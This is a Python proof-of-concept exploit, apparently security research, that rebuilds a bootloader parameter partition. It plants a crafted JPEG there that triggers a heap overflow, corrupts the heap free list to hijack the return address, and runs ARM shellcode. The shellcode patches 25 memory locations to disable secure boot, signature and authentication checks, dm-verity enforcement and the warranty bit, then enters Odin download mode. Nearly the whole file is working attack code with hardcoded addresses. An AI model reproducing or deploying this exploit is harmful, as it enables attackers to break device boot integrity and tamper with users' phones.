#!/usr/bin/env python3

"""
@file heap_overflow.py
@brief Image Parser Heap Overflow PoC
@author Gabrielle Viala & Maxime Rossi Bellom
"""

from keystone import *
from ctypes import Structure, c_uint32, sizeof
from hexdump import hexdump
import tarfile
from pathlib import Path
import argparse
import shutil


##### Structure definition

# sb_patch: location and patch to apply in memory to bypass secure boot
# free_heap_chunk: structure describing the elements in the heap free list

class sb_patch(Structure):
	_fields_ = [
		("addr", c_uint32),
		("value", c_uint32)
	]
	def dump(self):
		print("sb_patch:")
		print(f"@0x{self.addr:x} -> \"{self.value}\"")


class free_heap_chunk(Structure):
	_fields_ = [
		("prev", c_uint32),
		("next", c_uint32),
		("size", c_uint32),
	]
	def dump(self):
		print("free_heap_chunk {")
		print(f"\tprev: 0x{self.prev:16x}\n"
			f"\tnext: 0x{self.next:16x}\n"
			f"\tsize: 0x{self.size:16x}\n"
			"}")

##### Data definition

TARGET_FILE         = "letter.jpg"
STACK_ADDR 			= 0xb9b03fe8
LR_ADDR 			= STACK_ADDR - 4
BUF_ADDR 			= 0xb9b2e01c
ALLOCATED_JPEG_SIZE = 0x100000 # Actual size allocated
DATA_OFFSET 		= 0x100

HEAP_HEAD 			= 0x4c5b9500
TARGET_ALLOC_SIZE 	= 0xb40     # the size of the alloc that will trigger the exec
FREE_CHUNK_SIZE 	= 0x62d1fe4 # size of the biggest free chunk before the corruption

VAR_ENV = b"ODIN\x00"
DOGE = b"                            $#(&                                         \n\x00\
                            $#(($                         $#((//$        \n\x00\
                            $#((((                      $((((////        \n\x00\
  Wow! Qb was here          ###//((#                 $#((((//////#       \n\x00\
                           $(#######################((/((//*/*//(/       \n\x00\
     very noice          $$$$$$####((((##########(//**((//*,,*///(       \n\x00\
                     &$$$$$$$$$$##((###(#(#(#######(/////,.,,/(((        \n\x00\
                   $$$$$$$$$$$$$#((####$####(#########(**.,/(((/#        \n\x00\
                 $$$$$$(**##$$###(((#$$$#$###(((#########(((((((($       \n\x00\
                $&&@&&#.,..(###$######$###(####(#(######$$##((**/##      \n\x00\
               &&&&&$$(*,/$$#$$$$$#(((*.#**. ,((##############(//(#$     \n\x00\
              &&&&&&$$$$$#$$$$$$$##((*,*/,..,*###$$$##$########(((#$     \n\x00\
              &&&&&&&&$$$$$$$$$$$$$###########$$$&&$$$#$$$$$####(###     \n\x00\
             &&&&&/......,,*$$$$$$$$$$$$######$$$$$$$$$$$$$$$$######$    \n\x00\
             &&&&&(,,.     .($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$########&   \n\x00\
             $$$$#/,. ....*(#(##$$$#$$$$$$$$$$$$$$$$$$$########((#####&  \n\x00\
             &&&$(/*,,,,,,/*/#(######$$$$#$$$$#$$#######$$$###((((((###  \n\x00\
             &&$$$/,,.   .,//#######((########$$$###$$$$$$$$###(###((##$ \n\x00\
             &&&$$$#(,,.,.,,...,,,*//(#####$$$$#$$$$$$$$$$####((((######&\n\x00\
              &&&$$$$#(((/(#((#((#####$#######$$$$$##$$$###(###((((((####\n\x00\
               $$$$$$$$$$$####################$$$$$######((((((((((((#(##\n\x00\
               $$$$$$$$$#$$$#############$$#$$$##$########((((///(((((###&\n\x00"
# Rip Kabosu, you'll be remembered as the best doge meme ever :'(

#### Partition Handling

def extract_part(partition, extracted_folder):
    if extracted_folder.is_dir():
        shutil.rmtree(extracted_folder) 
    extracted_folder.mkdir(parents=True, exist_ok=False)
    with tarfile.open(partition, 'r') as tar:
        tar.extractall(extracted_folder)

def smallest_file(folder):
    min_size = None
    smallest_file = None
    for f in folder.iterdir():
        if min_size is None or f.stat().st_size < min_size:
            min_size = f.stat().st_size
            smallest_file = f
    return smallest_file

def recompress_part(extracted_folder, output_name):
    with tarfile.open(output_name, 'w') as out:
        for f in extracted_folder.iterdir():
            out.add(f, f.name)


##### JPEG crafting

def craft_image(base_image, output_image):
    ## Real image
    with open(base_image, "br") as base:
        buffer = base.read()

    if len(buffer) % 4 != 0: # Code must be aligned
        buffer += bytearray(b'\0'*(4 - len(buffer) % 4))

    # Some padding before the actual payload
    buffer += bytearray(DATA_OFFSET)

    ## Data used in the payload
    #	array of patches for secure boot bypass
    patch_table = sb_patch * 25
    patches = patch_table(
                        sb_patch(0x4C51BF90, 0x00000000), # odin verif table: para access flag  
                        sb_patch(0x4C51c048, 0x00000000), # odin verif table: boot access flag  
                        sb_patch(0x4C4ACCD4, 0x4608462A), # memcpm in avb_slot_verify
                        sb_patch(0x4C428524, 0xf04fb5f8), # _do_decision function to only return 0 (a225f)	
                        sb_patch(0x4C428528, 0xbdf80000), #   ...
                        sb_patch(0x4C412660, 0xF04Fff75), # is_sbc function to return 0 (for disabled)
                        sb_patch(0x4C412664, 0xBD080000), # 	...
                        sb_patch(0x4C4AF64C, 0xd0004770), # device_corrupted: do not power off if dm-verity broken
                        sb_patch(0x4C43E024, 0xf04ffe45), # get_efuse_blow_status to return 0 (sbc disabled)
                        sb_patch(0x4C43E028, 0xbdf80000), #   ...
                        sb_patch(0x4C4AF7C8, 0x461cb0b7), # authcheck to set arg1 0
                        sb_patch(0x4C4AF984, 0xf04f0010), # authcheck to always return 0
                        sb_patch(0x4C4AF988, 0xb0370000), #   ...
                        sb_patch(0x4C4BB368, 0x0003f04f), # SEC_UNLOCK: always return 3
                        sb_patch(0x4C4BB36c, 0xf7ff46f7), #	...
                        sb_patch(0x4C4A992c, 0xf04f4798), # Force device as unlocked (a225f)
                        sb_patch(0x4C4A9930, 0xf04f0000), # 	...
                        sb_patch(0x4C4A9934, 0xbb3b0301), # 	...
                        sb_patch(0x4C4DAD20, 0x0000303d), # force slot a of super image (a225f) // uaru=0 ??
                        sb_patch(0x4C443148, 0x20004479), # Force to accept different cmdline (a225f)
                        sb_patch(0x4C44314c, 0xb958460c), # 	...
                        sb_patch(0x4C42A3BC, 0x46f72000), # signer_check_QB_id: return 0 (a225f)
                        sb_patch(0x4C4BAD18, 0xf7ff4630), # memcpm in check_img_hash
                        sb_patch(0x4C43EBBC, 0x46f72000), # set_warranty_bit: do nothing and return 0 (a225f)
                        sb_patch(0x4C4284EC, 0x65442400) # _check_rp_version: set authinfo field_0x54 to 0 (a225f)
    )

    patch_addr = BUF_ADDR + len(buffer)
    buffer += bytes(patches)

    #	address of function to call in the shellcode
    function_table = c_uint32 * 6
    api_table = function_table(0x4C457848 | 1,  # printf
                            0x4c485cd8 | 1,  # get_env
                            0x4C485EF0 | 1,  # set_env
                            0x4c42517c | 1)  # do_download

    api_table_addr = BUF_ADDR + len(buffer)  
    str_addr = api_table_addr + sizeof(function_table)
    buffer += bytes(api_table)

    #	strings to print

    buffer += VAR_ENV
    buffer += DOGE

    if len(buffer) % 4 != 0: # Code must be aligned
        buffer += bytearray(b'\0'*(4 - len(buffer) % 4))

    payload_addr = BUF_ADDR + len(buffer)

    print(f"\tBuffer size before payload: {len(buffer):x}")
    print(f"\tStrings at 0x{str_addr:08x}")
    print(f"\tPayload at 0x{payload_addr:08x}")


    ## Payload

    def compute_size(sz):
        sz += sizeof(free_heap_chunk)
        pad = 0x4 - (sz % 0x4) if sz % 0x4 else 0
        return sz + pad

    chunk_size = compute_size(TARGET_ALLOC_SIZE)
    print(f"\talloc size: {TARGET_ALLOC_SIZE:x} chunk size = {chunk_size:x}")
    remaining_size = FREE_CHUNK_SIZE - chunk_size


    CODE  = b"add pc, pc, 0x4; " # skip the next instruction that will be replaced during the exploit
    CODE += b"nop; " # Always 4 bytes on ARM
    CODE += b"nop; " # Always 4 bytes on ARM
    CODE += b"nop; " # Always 4 bytes on ARM
    CODE += b"nop; " # Always 4 bytes on ARM

    # CODE  += b"push {r0-r11};"

    ### fix heap
    CODE += b"mov r3, #0x%x;" % (HEAP_HEAD >> 0x10)
    CODE += b"lsls r3, r3, 0x10;"
    CODE += b"mov r8, #0x%x;" % (HEAP_HEAD & 0xffff)
    CODE += b"orr r3, r3, r8;"
    CODE += b"add r0, r0, #0xc00;" #% chunk_size # r0 => last allocated chunk
    CODE += b"str r0, [r3];"
    CODE += b"str r0, [r3, #4];"
    CODE += b"str r3, [r0];"
    CODE += b"str r3, [r0, #4];"
    CODE += b"mov r3, #0x%x;" % (remaining_size >> 0x10)
    CODE += b"lsls r3, r3, 0x10;"
    CODE += b"mov r8, #0x%x;" % (remaining_size & 0xffff)
    CODE += b"orr r3, r3, r8;"
    CODE += b"str r3, [r0, #8];"

    ### remove some security features
    # r5 => patch addresses
    # r6 => patch content
    CODE += b"mov r5, #0x%x;" % (patch_addr >> 0x10)
    CODE += b"lsls r5, r5, 0x10;"
    CODE += b"mov r8, #0x%x;" % (patch_addr & 0xffff)
    CODE += b"orr r5, r5, r8;"
    CODE += b"add r6, r5, #4;"
    # loop and apply patches
    CODE += b"mov r4, #0;"
    CODE += b"add r3, r5, r4, LSL #3;"
    CODE += b"add r2, r6, r4, LSL #3;"
    CODE += b"ldr r3, [r3];"
    CODE += b"ldr r2, [r2];"
    CODE += b"str r2, [r3];"
    CODE += b"add r4, r4, #1;"
    CODE += b"cmp r4, #0x%x;" % (len(patches))
    CODE += b"sublt pc, #0x24;"

    ### do some post exploit stuff
    # r5 => function table address
    # r7 => string table address
    CODE += b"mov r5, #0x%x;" % (api_table_addr >> 0x10)
    CODE += b"lsls r5, r5, 0x10;"
    CODE += b"mov r8, #0x%x;" % (api_table_addr & 0xffff)
    CODE += b"orr r5, r5, r8;"

    CODE += b"mov r7, #0x%x;" % (str_addr >> 0x10)
    CODE += b"lsls r7, r7, 0x10;"
    CODE += b"mov r6, #0x%x;" % (str_addr & 0xffff)
    CODE += b"orr r7, r7, r6;"
    
    ### check in which stage we are
    CODE += b"mov r0, r7;"
    CODE += b"ldr r4, [r5, #0x4];"	
    CODE += b"blx r4;"	
    CODE += b"cmp r0, #0;"
    CODE += b"addne pc, #0x20;"

    ### add odin env
    CODE += b"sub sp, #0x4;"
    CODE += b"add r1, sp, #0x4;"
    CODE += b"mov r0, r7;"
    CODE += b"ldr r4, [r5, #0x8];"	
    CODE += b"blx r4;"
    CODE += b"add sp, #0x4;"

    ### call Odin
    CODE += b"mov r0, #0x2;"
    CODE += b"ldr r4, [r5, #0xc];"	
    CODE += b"blx r4;"	

    ### do stupid stuff
    CODE += b"mov r6, #%x;" % (len(VAR_ENV))
    CODE += b"add r0, r6, r7;"
    CODE += b"ldr r4, [r5, #0];"	
    CODE += b"blx r4;"				# print(DOGE)
    CODE += b"add r6, r6, #0x4b;"
    CODE += b"cmp r6, #0x670;"
    CODE += b"suble pc, #0x1c;"

    # CODE  += b"pop {r0-r11};"

    # Restores the stack and returns up to before drawimg
    CODE  += b"add sp,#0x8;"
    CODE  += b"pop {r4-r10,lr};"
    CODE  += b"add sp,#0x8;"
    CODE  += b"pop {r4,lr};"
    CODE  += b"add sp,#0x48;"                             # return drawimg
    CODE  += b"pop {r4,r5,r6,r7,r8,r9,r10,pc};"


    # build shellcode
    # print(CODE)
    encoding = bytearray()
    count = 0

    try:
        ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)
        exit(-2)

    payload = bytes(encoding)
    hexdump(payload)

    # add payload to buffer
    buffer += payload
    buffer += bytearray(ALLOCATED_JPEG_SIZE-len(buffer)) # Fill the rest of our buffer with 0s
    print(f"\tsize buffer: {len(buffer):x}")


    ### Smash the next free chunk :D

    # Address of our shellcode in this buffer
    fake_ret_addr = payload_addr # ARM, Carefull!
    print(f"\tfake addr: {fake_ret_addr:08x}")

    # We overwrite the heap metadatas after our buffer to create a fake chunk
    fake_chunk1 = BUF_ADDR + ALLOCATED_JPEG_SIZE + 0x1c
    print(f"\tfake chunk: {fake_chunk1:08x}")

    free_chunk = free_heap_chunk()
    free_chunk.prev = 0xaaaaaaaa
    free_chunk.next = fake_chunk1
    free_chunk.size = 0x1c
    buffer += bytes(free_chunk)
    buffer += bytearray(0x10) # fill our fake chunk with 0s

    # # Our fake chunk if followed by a free huge chunk
    free_chunk = free_heap_chunk()
    # Here we put what to write, carefull this + 4 will also be written!!
    free_chunk.prev = fake_ret_addr
    # Here we put where to write, carrefull that this 
    free_chunk.next = LR_ADDR
    free_chunk.size = chunk_size # Must be the exact size of the next allocation
    buffer += bytes(free_chunk)

    # Write our jpeg
    with open(output_image, "bw") as out:
        out.write(buffer)

def build_partition(partition):
    temp_folder = Path(partition.name + ".extracted")
    output_part = Path(partition.name + ".patched")

    print(f"[!] Extract images in {temp_folder}")
    extract_part(partition, temp_folder)


    base_file = smallest_file(temp_folder)
    output_file = Path(temp_folder / TARGET_FILE)
    if output_file.is_file():
        output_file.chmod(0o755)

    print(f"[!] Craft new {TARGET_FILE} from {base_file.name}")
    craft_image(base_file, output_file)

    # fix access rights
    output_file.chmod(0o555)

    print(f"[!] Recompress files")
    recompress_part(temp_folder, output_part)

    print(f"[+] Output: {output_part}")
    return output_part

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument('partition', type=Path, help="path to the param_up.img")
    args = parser.parse_args()

    partition = args.partition
    build_partition(partition)